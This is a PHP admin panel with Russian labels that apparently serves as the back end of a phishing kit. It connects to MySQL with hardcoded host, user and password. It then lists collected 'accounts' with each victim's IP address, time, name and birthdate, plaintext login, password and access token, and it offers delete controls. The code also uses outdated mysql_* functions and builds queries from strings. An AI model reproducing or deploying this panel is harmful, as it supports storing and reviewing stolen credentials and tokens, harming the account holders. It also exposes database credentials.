		<?php session_start ();

		if (!$_SESSION['admin']) die ( Запрещено );

		?>
		<?php

		$link = mysql_connect("mysql.zzz.com.ua", "bxlelzt", "1234567890Bxle"); // 1 - Оставляем localhost. 2 - Имя пользователя. 3 - Пароль пользователя.
		mysql_select_db("bxlelzt", $link); // Название Базы Данных

		$result = mysql_query("SELECT * FROM text", $link);
		$num_rows = mysql_num_rows($result);
		?>
		<?php
		$hostname = "mysql.zzz.com.ua"; // Оставляем localhost
		$username = "bxlelzt"; // Имя пользователя
		$password = "1234567890Bxle"; // Пароль пользователя
		$dbName = "bxlelzt"; // Название Базы Данных
		 
		$table = "test";
		 
		mysql_connect($hostname, $username, $password) or die ("Неудачное соединение");
		 
		mysql_select_db($dbName) or die (mysql_error());
		 
		if (isset($_GET['del'])) {
		   $del = intval($_GET['del']);
		   $query = "delete from $table where (id='$del')";
		   mysql_query($query) or die(mysql_error());
		}
		 
		$query = "SELECT * FROM $table";
		$res = mysql_query($query) or die(mysql_error());
		$row = mysql_num_rows($res);
		 
		echo ("
		<html>
		 
		<head>

		   <meta charset=»utf-8″ />
		 
			<title>Admin Panel</title>
		  <link rel=\"shortcut icon\" href=\"admin.ico\">
		<style type=\"text/css\">
		<!--
		h3 { font-size: 16px; text-align: center; }
		td { padding: 3px; text-align: center; vertical-align: middle; }
		.buttons { width: auto; border: double 1px #666666; background: #D6D6D6; }
		-->
		</style>
		 
		</head>
		<body>
		<br><center><a class=admin>Административная панель </a></center><br><br>
		<div class=\"rectangle\"><br>

		
		<font class=knopka>Всего аккакунтов: $row</font>
		<a name=\"key\" href=\"text.php\" class=knopka>Текстовый вывод</a>
		<a name=\"deleter\" href=\"delete.php\" class=knopka>Удалить все аккаунты</a>
		<a name=\"key\" href=\"logout.php\" class=knopka22>Выход</a></center><br><br><br>
		<div id=\"rectangle\"> </div>

		 

		<table class=\"simple-little-table\"cellspacing=\"0\" class=\"simple-little-table\">
		 <tr style=\"border: solid 1px #000\">
		  <td align=\"center\"><b>Номер</b></td>
		  <td align=\"center\"><b>Айпи</b></td>
		  <td align=\"center\"><b>Время</b></td>
		  <td align=\"center\"><b>Информация о профиле</b></td>
		  <td align=\"center\"><b>Логин</b></td>
		  <td align=\"center\"><b>Пароль</b></td>
		  <td align=\"center\"><b>Токен</b></td>
		  <td align=\"center\"><b>Удалить?</b></td>
		 </tr>
		 
		 
		");
		while ($row = mysql_fetch_array($res)) {
			echo "<tr>\n";
			echo "<td>".$row['id']."</td>\n";
			echo "<td>".$row['aipi']."</td>\n";
			echo "<td>".$row['vremya']."</td>\n";
			echo "<td>".$row['lastname']." ".$row['firstname']." ".$row['bdate']."</td>\n";
			echo "<td>".$row['login']."</td>\n";
			echo "<td>".$row['pass']."</td>\n";
			echo "<td>".$row['token']."</td>\n";
			echo "<td><a name=\"del\" href=\"admin/accounts.php?del=".$row["id"]."\" class=knopka5>Delete</a></td>\n";
			echo "</tr>\n";
		}
		 
		echo ("</div></table>\n");
		 
		mysql_close();
			
		?>
		</div>
		<style>
			html {
		  background:#000 url("http://www.chromamarketing.com/wp-content/uploads/2016/11/Blue-Purple-Background-2.jpg") center top no-repeat;
		  background-size: cover;
		  min-height: 1500px;
		  weight: inherit;
		  min-height: 1500px;
		  height: inherit;
		  font-family: "Open Sans", sans-serif;
		  font-family: 'Montserrat', sans-serif;
	      margin:0;
			}
			table { 
				  border-radius:3px;
				font-size:17px;
				width: 700px; 
				border-collapse: 
				collapse; margin: 0px auto; 
				background-color: FFFFFF;
				box-shadow:0px 0px 3px 1px black;
				
			}	
				.knopka5 {
  font-weight: 700;
  color: white;
  padding: .8em 1em calc(.8em + 3px);
  border-radius: 3px;
  background: #33d9de;
  box-shadow: 0 -3px rgb(52, 66, 167) inset;
  transition: 0.2s;
} 
.knopka5:hover { background: #1f5bd3; }
.knopka5:active {
  background: #215d92;
  box-shadow: 0 3px #215d92 inset;
}
				
				.knopka	 {
			text-decoration: none;
  outline: none;
  display: inline-block;
  padding: 12px 40px;
  margin: 10px 20px;
  border-radius: 30px;
  background-image: linear-gradient(45deg, #6ab1d7 0%, #33d9de 50%, #002878 100%);
  background-position: 100% 0;
  background-size: 200% 200%;
  font-family: 'Montserrat', sans-serif;
  font-size: 24px;
  font-weight: 300;
  color: white;
  box-shadow: 0 16px 32px 0 rgba(0,40,120,.35);
  transition: .5s;
		} 
		.knopka:hover {
		 box-shadow: 0 0 0 0 rgba(0,40,120,0);
  background-position: 0 0;
		}
		
		.knopka22 {
			text-decoration: none;
  outline: none;
  display: inline-block;
  padding: 12px 40px;
  margin: 10px 78px;
  border-radius: 30px;
  background-image: linear-gradient(45deg, #6ab1d7 0%, #33d9de 50%, #002878 100%);
  background-position: 100% 0;
  background-size: 200% 200%;
  font-family: 'Montserrat', sans-serif;
  font-size: 24px;
  font-weight: 300;
  color: white;
  box-shadow: 0 16px 32px 0 rgba(0,40,120,.35);
  transition: .5s;
		} 
		.knopka22:hover {
		 box-shadow: 0 0 0 0 rgba(0,40,120,0);
  background-position: 0 0;
		}
		
		
			tr {
				height:36px;
			}
			tr {
				height:6px;
			}
				@import url(https://fonts.googleapis.com/css?family=Rubik+One&subset=latin,cyrillic);
				.admin {
						font-family: 'Rubik One', sans-serif;
						font-size: 50px;
						text-transform: uppercase;
						background: linear-gradient(45deg, #019ffc 0%, #c23093 100%);
						-webkit-background-clip: text;
						-webkit-text-fill-color: transparent;
						color: #0B2349;
						display: table;
						margin: 20px auto;
						         }
				 
				 .simple-little-table {
			font-family:Arial, Helvetica, sans-serif;
			color:#666;
			font-size:14px;
			text-shadow: 1px 1px 0px #fff;
			background:#eaebec;
			margin:0 11px;
			border:#ccc 1px solid;
			border-collapse:separate;
		 
			-moz-border-radius:3px;
			-webkit-border-radius:3px;
			border-radius:3px;
		 
			-moz-box-shadow: 0 1px 2px #d1d1d1;
			-webkit-box-shadow: 0 1px 2px #d1d1d1;
			box-shadow: 0 1px 2px #d1d1d1;
		}
		 
		.simple-little-table th {
			font-weight:bold;
			padding:21px 25px 22px 25px;
			border-top:1px solid #fafafa;
			border-bottom:1px solid #e0e0e0;
		 
			background: #ededed;
			background: -webkit-gradient(linear, left top, left bottom, from(#ededed), to(#ebebeb));
			background: -moz-linear-gradient(top,  #ededed,  #ebebeb);
		}
		.simple-little-table th:first-child{
			text-align: left;
			padding-left:10px;
		}
		.simple-little-table tr:first-child th:first-child{
			-moz-border-radius-topleft:3px;
			-webkit-border-top-left-radius:3px;
			border-top-left-radius:3px;
		}
		.simple-little-table tr:first-child th:last-child{
			-moz-border-radius-topright:3px;
			-webkit-border-top-right-radius:3px;
			border-top-right-radius:3px;
		}
		.simple-little-table tr{
			text-align: center;
			padding-left:10px;
		}
		.simple-little-table tr td:first-child{
			text-align: center;
			padding-left:10px;
			border-left: 0;
		}
		.simple-little-table tr td {
			padding:8px;
			border-top: 1px solid #ffffff;
			border-bottom:1px solid #e0e0e0;
			border-left: 1px solid #e0e0e0;
		 
			background: #fafafa;
			background: -webkit-gradient(linear, left top, left bottom, from(#fbfbfb), to(#fafafa));
			background: -moz-linear-gradient(top,  #fbfbfb,  #fafafa);
		}
		.simple-little-table tr:nth-child(even) td{
			background: #f6f6f6;
			background: -webkit-gradient(linear, left top, left bottom, from(#f8f8f8), to(#f6f6f6));
			background: -moz-linear-gradient(top,  #f8f8f8,  #f6f6f6);
		}
		.simple-little-table tr:last-child td{
			border-bottom:0;
		}
		.simple-little-table tr:last-child td:first-child{
			-moz-border-radius-bottomleft:3px;
			-webkit-border-bottom-left-radius:3px;
			border-bottom-left-radius:3px;
		}
		.simple-little-table tr:last-child td:last-child{
			-moz-border-radius-bottomright:3px;
			-webkit-border-bottom-right-radius:3px;
			border-bottom-right-radius:3px;
		}
		.simple-little-table tr:hover td{
			background: #f2f2f2;
			background: -webkit-gradient(linear, left top, left bottom, from(#f2f2f2), to(#f0f0f0));
			background: -moz-linear-gradient(top,  #f2f2f2,  #f0f0f0);
		}
		 
		.simple-little-table a:link {
			color: #666;
			font-weight: bold;
			text-decoration:none;
		}
		.simple-little-table a:visited {
			color: #999999;
			font-weight:bold;
			text-decoration:none;
		}
		.simple-little-table a:active,
		.simple-little-table a:hover {
			color: #bd5a35;
			text-decoration:underline;
		}
		.rectangle {	
			max-width: 1350px;
			width: 100%;
			min-height: 350px;
			height: inherit;
			background:#000 url("http://www.chromamarketing.com/wp-content/uploads/2016/11/Blue-Purple-Background-2.jpg") center top no-repeat;
			margin: auto;
			box-shadow: 10px 10px 10px #000; 
		}

		</style>